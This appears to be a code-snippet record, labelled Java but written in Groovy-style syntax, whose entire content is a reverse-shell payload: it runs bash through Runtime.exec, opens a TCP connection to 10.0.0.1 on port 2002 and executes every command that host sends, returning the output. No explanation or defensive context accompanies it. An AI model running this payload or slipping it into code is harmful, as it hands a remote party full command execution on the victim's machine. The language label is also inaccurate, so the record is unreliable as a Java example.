---
id: 9060d5af-c9e4-416b-8417-558744569ec3
type: code
language: Java
verified: false
created_at: '2019-09-17T20:45:43.059106+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 9060d5af

**Language**: Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \ $line 2>&5 >&5; done"] as String[])
p.waitFor()
```


